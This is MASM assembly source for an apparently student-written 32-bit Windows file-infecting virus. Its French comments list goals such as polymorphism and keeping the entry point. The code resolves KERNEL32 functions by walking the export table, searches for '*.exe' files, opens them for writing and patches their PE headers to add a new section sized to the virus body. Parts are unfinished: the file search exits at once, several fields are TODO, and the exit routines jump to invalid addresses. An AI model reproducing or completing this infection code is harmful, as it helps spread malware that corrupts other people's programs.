; donothing.asm FOR 32 BIT archs only
; new section -> addr la plus grande d une section + sa taille
; si pas la place -> quit
; bonus: UPX unpacker
; bonus: infecte peut infecter
; bonus: ne pas modifier entry point
; bonus: polymorphique obligatoire

.386
.model flat, stdcall
option casemap: none

    include \masm32\include\windows.inc
    include \masm32\include\user32.inc
    include \masm32\include\kernel32.inc

    include \masm32\include\masm32.inc
    include \masm32\include\msvcrt.inc

    includelib \masm32\lib\user32.lib
    includelib \masm32\lib\kernel32.lib

    includelib \masm32\lib\masm32.lib
    includelib \masm32\lib\msvcrt.lib

.data
; No data here please, put it at the end of the .code section

.code

start:

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Find the KERNEL32 base address, works at the entry point of the program
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    mov     esi,[esp]
    and     esi,0FFFF0000h

find_PE:
    sub     esi,1000h           ; find the DOS Header (aligned on 0x1000)
    cmp     word ptr [esi],"ZM"
    jne     find_PE

    mov     ecx,[esi+3Ch]       ; offset to EXE header
    lea     edi,[esi+ecx]       ; address of the EXE header
    cmp     word ptr [edi],"EP" ; double check with the "PE" magic
    jne     exit_fail

; DELTA OFFSET to retrieve any variable address
    call deltaoffset
deltaoffset:
    pop ebp ; put EIP in ebp

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; TUTORIAL: how to use function and data
; Call a kernel32 routine:
; Important: ebp, esi and edi are needed each time, keep them safe ;)
; STEP 1 -> create routine_b at the end of the file
; STEP 2 -> use delta offset to get it's address
; mov     eax,ebp ; EBP -> real address of delta offset
; add     eax,offset ExitProcess_b
; sub     eax,offset deltaoffset
; STEP 3 -> call ent_get_function_addr with "routine"
; push    eax
; push    edi ; PE header
; push    esi ; DOS header
; call    ent_get_function_addr
; STEP 4 -> push args && call the function
; push    2
; call    eax ; will call ExitProcess with exitval = 2
; STEP 5 -> verify with echo %errorlevel% it should print 2 in this case
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


;jmp benjamin ; For testing

    push    ebp ; Delta offset
    push    edi ; PE header
    push    esi ; DOS header
    call    find_file

    jmp     exit_success


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Find first file to infect
; following filter '*.exe', exit_fail if none is found
; 3 params:
;   pointer to the DOS header -> ebp + 8
;   pointer to the PE header -> ebp + 12
;   address of the delta offset -> ebp + 16
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
find_file:

    jmp exit_fail
    ; Set up a stack frame
    push    ebp
    mov     ebp,esp
    ; Saves context
    push    ebx
    push    esi
    push    edi

    ; Get FindFirstFileA addr
    mov     eax,[ebp+16]
    add     eax,offset FindFirstFile_b
    sub     eax,offset deltaoffset
    push    eax ; Address of the func name
    push    [ebp+12] ; PE header
    push    [ebp+8]  ; DOS header
    call    ent_get_function_addr
    push    eax ; [ebp - 16]
    ; Get FindNextFileA addr
    mov     eax,[ebp+16]
    add     eax,offset FindNextFile_b
    sub     eax,offset deltaoffset
    push    eax ; Address of the func name
    push    [ebp+12] ; PE header
    push    [ebp+8]  ; DOS header
    call    ent_get_function_addr
    push    eax ; [ebp-20]

    ; make room for a WIN32_FIND_DATA struct of 320 at @esp
    sub     esp,344

    ; push WIN32_FIND_DATA struct and filter '*.exe' and call FindFirstFile
    lea     ebx,[ebp-344]
    push    ebx
    lea     ebx,[filter]
    push    ebx
    mov     ebx,[ebp-16]
    call    ebx

    ; If it hasn't found any file, jumps to exit_fail
    cmp     eax,-1
    jz      exit_fail

    ; else save handler
    ;push    eax ; [ebp-24]
    mov     [ebp-24],eax
    jmp     infect

    find_next:

    ; push WIN32_FIND_DATA struct, find handle and call FindNextFileA
    lea     ebx,[ebp-344]
    push    ebx
    mov     ebx,[ebp-24] ; find handle
    push    ebx
    mov     ebx,[ebp-20]
    call    ebx

    ; if no file found, jump to end_find_next
    cmp     eax,00h
    jz      end_find_file

    infect:
    ; store cFileName in eax
    sub     ebp,300
    mov     eax,ebp ; save cFileName
    add     ebp,300

    push    eax ; file name
    push    [ebp+16] ; Delta offset
    push    [ebp+12] ; PE header
    push    [ebp+8] ; DOS header
    call    infect_file

    jmp     find_next

    end_find_file:
    ; cleanup/return
    pop     edi
    pop     esi
    pop     ebx
    add     esp,344 ; alloc for WIN32_FIND_DATA
    mov     esp,ebp
    pop     ebp
    ret     16


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Infect file
; 4 params:
;   pointer to the DOS header -> ebp + 8
;   pointer to the PE header -> ebp + 12
;   address of the delta offset -> ebp + 16
;   name of .exe file -> ebp + 20
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
infect_file:

    ; Set up a stack frame
    push    ebp
    mov     ebp,esp
    ; Saves context
    push    ebx
    push    esi
    push    edi

    ; Get CreateFileA addr
    mov     eax,[ebp+16]
    add     eax,offset CreateFile_b
    sub     eax,offset deltaoffset
    push    eax ; Address of the func name
    push    [ebp+12] ; PE header
    push    [ebp+8]  ; DOS header
    call    ent_get_function_addr

    ; open file
    push    0 ; attr template
    push    FILE_ATTRIBUTE_NORMAL
    push    OPEN_EXISTING
    push    0 ; default security
    mov     ebx,FILE_SHARE_READ
    xor     ebx,FILE_SHARE_WRITE
    push    ebx ; read && write
    mov     ebx,GENERIC_READ
    xor     ebx,GENERIC_WRITE
    push    ebx ; read && write
    mov     ebx,[ebp+20]
    push    ebx
    call    eax ; CreateFileA()

    ; return if file couldn't be opened
    cmp     eax, -1 ; INVALID_HANDLE_VALUE
    jz      end_infect_file

    ; else
    push    eax ; save the fd
    ; Create a new section
    push    eax ; File descriptor
    push    [ebp+16] ; Delta offset
    push    [ebp+12] ; PE header
    push    [ebp+8]  ; DOS header
    call    new_code_section

    pop     ebx ; restore the fd
    mov     eax,[ebp+16]
    add     eax,offset CloseHandle_b
    sub     eax,offset deltaoffset
    push    eax ; Address of the func name
    push    [ebp+12] ; PE header
    push    [ebp+8]  ; DOS header
    call    ent_get_function_addr
    ; CloseHandle(fd)
    push    ebx
    call    eax

end_infect_file:
    ; cleanup/return
    pop     edi
    pop     esi
    pop     ebx
    mov     esp,ebp
    pop     ebp
    ret     20




;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;                                                    ;;
;;                  Code Benjamin                     ;;
;;                                                    ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
benjamin:
    ; Get CreateFile addr
    mov     eax,ebp
    add     eax,offset CreateFile_b
    sub     eax,offset deltaoffset
    push    eax ; Address of the func name
    push    edi ; PE header
    push    esi ; DOS header
    call    ent_get_function_addr

    ; TODO: foreach file in current dir
    ; Open a file (TODO: use each file)
    push    0 ; attr template
    push    FILE_ATTRIBUTE_NORMAL
    push    OPEN_EXISTING
    push    0 ; default security
    mov     ebx,FILE_SHARE_READ
    xor     ebx,FILE_SHARE_WRITE
    push    ebx ; read && write
    mov     ebx,GENERIC_READ
    xor     ebx,GENERIC_WRITE
    push    ebx ; read && write
    mov     ebx,ebp
    add     ebx,offset testFile
    sub     ebx,offset deltaoffset
    push    ebx ; .exe path
    call    eax ; CreateFile()

    push    eax ; save the fd
    ; Create a new section
    push    eax ; File descriptor
    push    ebp ; Delta offset
    push    edi ; PE header
    push    esi ; DOS header
    call    new_code_section

    pop     ebx ; restore the fd
    mov     eax,ebp
    add     eax,offset CloseHandle_b
    sub     eax,offset deltaoffset
    push    eax ; Address of the func name
    push    edi ; PE header
    push    esi ; DOS header
    call    ent_get_function_addr
    ; CloseHandle(fd)
    push    ebx
    call    eax

    call exit_success

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Create a new code section in the executable
; Return the old entry point (to resume execution after our payload) or 0
; 4 params:
;   pointer to the DOS header -> ebp + 8
;   pointer to the PE header -> ebp + 12
;   address of the delta offset -> ebp + 16
;   file descriptor to a .exe (r+w) -> ebp + 20
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
new_code_section:

    ; Set up a stack frame
    push    ebp
    mov     ebp,esp
    ; Saves context
    push    ebx
    push    esi
    push    edi

    ; Get ReadFile addr
    mov     eax,[ebp+16]
    add     eax,offset ReadFile_b
    sub     eax,offset deltaoffset
    push    eax ; Address of the func name
    push    [ebp+12] ; PE header
    push    [ebp+8]  ; DOS header
    call    ent_get_function_addr
    push    eax ; [ebp - 16]
    ; Get WriteFile addr
    mov     eax,[ebp+16]
    add     eax,offset WriteFile_b
    sub     eax,offset deltaoffset
    push    eax ; Address of the func name
    push    [ebp+12] ; PE header
    push    [ebp+8]  ; DOS header
    call    ent_get_function_addr
    push    eax ; [ebp-20]
    ; Get SetFilePointer addr
    mov     eax,[ebp+16]
    add     eax,offset SetFilePointer_b
    sub     eax,offset deltaoffset
    push    eax ; Address of the func name
    push    [ebp+12] ; PE header
    push    [ebp+8]  ; DOS header
    call    ent_get_function_addr
    push    eax ; [ebp-24]

    ;[ebp-16] => readfile addr
    ;[ebp-20] => writefile addr
    ;[ebp-24] => setfilepointer addr
    ; make room for a read of 512 at @esp
    sub     esp,512
    mov     esi,esp ; save esp

    ; Read(fd, esi, 2, 0, 0)
    mov     ebx,[ebp-16]
    push    0
    push    0
    push    2
    push    esi
    push    [ebp+20]
    call    ebx
    cmp     word ptr [esi],"ZM"
    jne     exit_fail ; we should have MZ in the stack

    ; Move to the new offset header field in the PE header
    mov     ebx,[ebp-24]
    push    FILE_BEGIN
    push    0
    push    03Ch
    push    [ebp + 20]
    call    ebx

    ; Read(fd, esi, 4, 0, 0)
    mov     ebx,[ebp-16]
    push    0
    push    0
    push    4
    push    esi
    push    [ebp+20]
    call    ebx

    xor eax,eax
    mov eax,[esi] ; Get the offset to the PE header

    ; Move to the PE header
    mov     ebx,[ebp-24]
    push    FILE_BEGIN
    push    0
    push    eax
    push    [ebp+20]
    call    ebx

    ; Read(fd, esi, 2, 0, 0)
    mov     ebx,[ebp-16]
    push    0
    push    0
    push    4
    push    esi
    push    [ebp+20]
    call    ebx
    cmp     word ptr [esi],"EP"
    jne     exit_fail ; we should have EP in the stack

    ; Move to the Number of section field
    mov     ebx,[ebp-24]
    push    FILE_CURRENT
    push    0
    push    2
    push    [ebp+20]
    call    ebx

    ; Read(fd, esi, 4, 0, 0) nsection
    mov     ebx,[ebp-16]
    push    0
    push    0
    push    2
    push    esi
    push    [ebp+20]
    call    ebx

    ; get number of section
    xor ecx,ecx
    mov cx,[esi]
    mov edi,ecx ; safekeeping for later
    ; write inc-ed number of section
    inc cx
    mov [esi],cx

    ; Move to the Number of section field
    mov     ebx,[ebp-24]
    push    FILE_CURRENT
    push    0
    push    -2
    push    [ebp+20]
    call    ebx

    ; Write the updated number of section
    mov     ebx,[ebp-20]
    push    0
    push    0
    push    2
    push    esi
    push    [ebp+20]
    call    ebx

    push    [ebp+20] ; file descriptor
    push    [ebp+16] ; delta offset
    push    [ebp+12] ; PE header
    push    [ebp+8]  ; DOS header
    push    [ebp-16] ; readfile
    push    [ebp-20] ; writefile
    push    [ebp-24] ; setfilepointer
    push    edi      ; old number of section
    push    esi      ; Addr to collect the PTR TO RAW DATA
    call    new_image_section_header
    ; -> esi(esp) -> struct(sizeV,rva,etc.etc)
    ; tODO: before, save setfileptr ret
    ; -> update image opt header avec + sizes
    ; -> setfileptr to PTR TO RAW DATA
    ; -> return the old entry point (RVA new section)


    ; cleanup/return
    add     esp,12 ; alloc for func ptrs
    add     esp,512 ; alloc for read/write
    pop     edi
    pop     esi
    pop     ebx
    mov     esp,ebp
    pop     ebp
    ret     16


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Add an image section header for our code
; Return 0 for success (nothing else for now)
; 9 params:
;   Addr to collect the PTR TO RAW DATA -> ebp + 8
;   old number of section -> ebp + 12
;   setfilepointer -> ebp + 16
;   writefile -> ebp + 20
;   readfile -> ebp + 24
;   DOS header -> ebp + 28
;   PE header -> ebp + 32
;   delta offset -> ebp + 36
;   file descriptor -> ebp + 40
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
new_image_section_header:

    ; Set up a stack frame
    push    ebp
    mov     ebp,esp
    ; Saves context
    push    ebx
    push    esi
    push    edi

    ; some space to work with
    sub     esp,512

    ; Move to the Number of data directories field
    mov     ebx,[ebp+16]
    push    FILE_CURRENT
    push    0
    push    6Ch
    push    [ebp+40]
    call    ebx

    mov     edx,esp ; save esp
    ; Read the number of data directories
    mov     ebx,[ebp+24]
    push    0
    push    0
    push    4
    push    edx ; esp
    push    [ebp+40]
    call    ebx

    mov     eax,[esp] ; number of data directories
    mov     ecx,8 ; size of one data directory
    mul     ecx ; size of all the data directories
    ; Move to the first image section header
    mov     ebx,[ebp+16]
    push    FILE_CURRENT
    push    0
    push    eax
    push    [ebp+40]
    call    ebx

    mov     esi,0
image_section_loop:
    ; Move to the virtual size
    mov     ebx,[ebp+16]
    push    FILE_CURRENT
    push    0
    push    8
    push    [ebp+40]
    call    ebx

    mov     edx,esp ; save esp
    ; Read data
    mov     ebx,[ebp+24]
    push    0
    push    0
    push    16 ; size / rva / etc.
    push    edx ; esp
    push    [ebp+40]
    call    ebx

    ; Is it the biggest?
    mov     edi,[esp+4] ; cmp with RVA
    cmp     esi,edi
    jg      image_section_smaller
    mov     esi,edi ; Update biggest RVA
    ; Now update the saved data @[ebp+8]
    mov     ecx,4  ; number of iteration
    mov     edi,[ebp+8]
    mov     ebx,esp
    mov     eax,[ebx]
    cld     ; hax-preparation
 image_section_saveloop:
    stosd ; hax dword
    add     ebx,4 ; next dword
    mov     eax,[ebx]
    loop    image_section_saveloop

image_section_smaller:

    ; Move to the next header
    mov     eax,SIZEOF IMAGE_SECTION_HEADER
    sub     eax,16
    mov     ebx,[ebp+16]
    push    FILE_CURRENT
    push    0
    push    eax
    push    [ebp+40]
    call    ebx

    ; are we done?
    mov     eax,[ebp+12]
    dec     eax
    mov     [ebp+12],eax
    cmp     eax,0
    jz     image_section_done

    ; again
    jmp     image_section_loop

image_section_done:
    ; Create new image section header !! TODO XXX
    ; ... we are at its position (check if we have room?)
    push    60000020h ; characteristics
    push    0 ; number of line numbers + relocations
    push    0 ; ptr to line numbers
    push    0 ; ptr to relocations
    push    0 ; TODO ptr to raw data
    push    virusSize ; size of raw data TODO -> delta offset
    push    0 ; TODO RVA
    push    0 ; TODO Virtual size (virusSize aligned)
    push    0 ; Null padd for name
    ;push    0x2e686178 ; name: .hax
    mov     esi,esp ; save esp

    ; Write the updated number of section
    mov     ebx,[ebp+20]
    push    0
    push    0
    push    SIZEOF IMAGE_SECTION_HEADER
    push    esi ; struct address on stack
    push    [ebp+40]
    call    ebx

    ; return success
    mov     eax,0

    ; cleanup/return
    add     esp,512
    pop     edi
    pop     esi
    pop     ebx
    mov     esp,ebp
    pop     ebp
    ret     36




;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Explore the ENT (Export Name Table) of KERNEL32
; And return the matching function address
; 3 params:
;   pointer to the DOS header -> ebp + 8
;   pointer to the PE header -> ebp + 12
;   pointer to the function name -> ebp + 16
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
ent_get_function_addr:

    ; Set up a stack frame
    push    ebp
    mov     ebp,esp
    ; Saves context
    push    ebx
    push    esi
    push    edi

    mov     edi,[ebp+8]
    mov     esi,[ebp+12]
    mov     esi,[esi+78h]       ; EXPORT table (RVA)
    mov     edx,[esi+edi+18h]   ; Number of names
    mov     ebx,[esi+edi+20h]   ; Address of names (RVA)
    add     ebx,edi             ; Address of names (absolute)

    ; STEP 1: get the name index in the name array
    push    [ebp + 16]
    push    edx
    push    [ebp+8]
    push    ebx
    call    ent_find_name

    ; STEP 2: get the ordinal in the ordinal array
    push    eax                 ; Index of name
    mov     edx,[esi+edi+10h]   ; Base ordinal
    push    edx
    mov     ebx,[esi+edi+24h]   ; Address of ordinals (RVA)
    add     ebx,edi             ; Address of ordinals (absolute)
    push    ebx
    call    ent_ordinal

    ; STEP 3: get the address in the function address array
    push    [ebp+8]
    push    eax
    mov     ebx,[esi+edi+1Ch]   ; Address of function addresses (RVA)
    add     ebx,edi             ; Address of function addresses (absolute)
    push    ebx
    call    ent_function

    pop     edi
    pop     esi
    pop     ebx
    mov     esp,ebp
    pop     ebp
    ret     12

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Returns the index the function name
; 4 params:
;   pointer to the ENT name array (absolute) -> ebp + 8
;   pointer to the DOS header (absolute) -> ebp + 12
;   Number of names -> ebp + 16
;   pointer to the name to look for -> ebp + 20
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
ent_find_name:

    ; Set up a stack frame
    push    ebp
    mov     ebp,esp

    ; Saves context
    push    ebx
    push    esi
    push    edi

    mov     esi,[ebp+20]    ; Name to look for
    mov     edx,[ebp+16]    ; Number of names
    mov     ecx,0           ; Initialize the counter

ent_next_name:

    mov     ebx,[ebp+8]
    mov     ebx,[ebx+ecx*4] ; First name pointer (RVA)
    mov     eax,[ebp+12]
    add     ebx,eax         ; First name pointer

    push    ecx             ; Save edx
    push    edx             ; Save edx
    nop
    nop ; Markers for debugging
    nop
    push    ebx
    push    esi
    call    strcmp_
    pop     edx             ; Restore edx
    pop     ecx             ; Restore ecx

    cmp     eax,0           ; Did we find the string?
    je      ent_name_success

    dec     edx
    jz      ent_name_done   ; No more names

    inc     ecx
    jmp     ent_next_name   ; Get next name

    ent_name_success:
    mov     eax,ecx
    jmp     ent_name_done

    ent_name_fail:
    mov     eax,-1          ; Return NULL, failed
    jmp     exit_fail

    ent_name_done:

    pop     edi
    pop     esi
    pop     ebx

    mov     esp,ebp
    pop     ebp
    ret     16

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; sub-routine: returns the name ordinal
; 3 params:
;   pointer to the ENT ordinal array (absolute) -> ebp + 8
;   base ordinal DWORD -> ebp + 12
;   index of the function name -> ebp + 16
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
ent_ordinal:

    ; Set up a stack frame
    push    ebp
    mov     ebp,esp

    ; Saves context
    push    ebx
    push    esi
    push    edi

    mov     esi,[ebp+8]     ; ordinal array (WORD*)
    mov     edx,[ebp+12]    ; base ordinal
    mov     ecx,[ebp+16]    ; index of function name

    xor     eax,eax
    mov     ax,[esi+ecx*2]

    ; XXX: adding base gives a wrong ordinal...
    ; the one already there is correct so well... oO
    ;add     eax,edx

    pop     edi
    pop     esi
    pop     ebx

    mov     esp,ebp
    pop     ebp
    ret     12

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; sub-routine: returns the function's address
; 2 params:
;   pointer to the ENT function array (absolute) -> ebp + 8
;   function ordinal (DWORD) -> ebp + 12
;   pointer to DOS header -> ebp + 16
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
ent_function:

    ; Set up a stack frame
    push    ebp
    mov     ebp,esp

    ; Saves context
    push    ebx
    push    esi
    push    edi

    mov     esi,[ebp+8]     ; function array
    mov     ecx,[ebp+12]    ; index
    mov     edx,[ebp+16]    ; DOS header of KERNEL32

    mov     eax,[esi+ecx*4] ; function RVA
    add     eax,edx         ; function address

    pop     edi
    pop     esi
    pop     ebx

    mov     esp,ebp
    pop     ebp
    ret     12

strlen_:
    ; Set up a stack frame
    push    ebp
    mov     ebp,esp

    ; Saves context
    push    ebx
    push    esi
    push    edi

    mov     esi,[ebp+8]
    xor     eax,eax ; zero out eax
    xor     ebx,ebx ; zero out ebx
strlen_iterate:
    mov     bl,[esi]
    test    bl,bl
    jz      strlen_done
    inc     eax
    inc     esi
    jmp     strlen_iterate
strlen_done:
    pop     edi
    pop     esi
    pop     ebx

    mov     esp,ebp
    pop     ebp
    ret     4

strcmp_:
    ; Set up a stack frame
    push    ebp
    mov     ebp,esp

    ; Saves context
    push    ebx
    push    esi
    push    edi

    mov     esi,[ebp+8]
    mov     edi,[ebp+12]
    xor     eax,eax ; zero out eax
    xor     ebx,ebx ; zero out ebx
strcmp_iterate:
    mov     bl,[esi]
    mov     al,[edi]
    test    bl,bl
    ; end of string
    jz      strcmp_done
    test    al,al
    jz      strcmp_done
    ; check for difference
    cmp     al,bl
    jne     strcmp_done
    inc     esi
    inc     edi
    jmp     strcmp_iterate

strcmp_done:
    sub     eax,ebx

    pop     edi
    pop     esi
    pop     ebx

    mov     esp,ebp
    pop     ebp
    ret     8

exit_success:
    ; WIN
    mov     eax,042h
    call    eax

exit_fail:
    ; For debug :D
    mov     eax,0DEADBEEFh
    call    eax

; All the virus data: use delta offset
; @MARC: ca ne peut pas marcher sauf si tu
; force la zone en r/w avec mprotect?
virus_data:
   filetime struct
       dwLowDateTime     DWORD     ?
       dwHighDateTime    DWORD     ?
   filetime ends

   find_data struct
       dwFileAttributes       DWORD ?
       ftCreationTime         filetime <?>
       ftLastAccessTime       filetime <?>
       ftLastWriteTime        filetime <?>
       nFileSizeHigh          DWORD ?
       nFileSizeLow           DWORD ?
       dwReserved0            DWORD ?
       dwReserved1            DWORD ?
       cFileName              BYTE 260 dup (?)
       cAlternateFileName     BYTE 14  dup (?)
   find_data ends

   ;win32_find_data find_data <?>
   filter          db "*.exe",0
   testFile        db "C:\Users\Benjamin\Documents\GitHub\donothing\TP0\donothing_2.exe",0
   testStr         db "bite",0
   virusSize       equ jambi_end - start

   FindFirstFile_b  db  "FindFirstFileA",0
   FindNextFile_b   db  "FindNextFileA",0
   ExitProcess_b    db  "ExitProcess",0
   Beep_b           db  "Beep",0
   CreateFile_b     db  "CreateFileA",0
   WriteFile_b      db  "WriteFile",0
   CloseHandle_b    db  "CloseHandle",0
   SetFilePointer_b db  "SetFilePointer",0
   ReadFile_b       db  "ReadFile",0

jambi_end:
end start
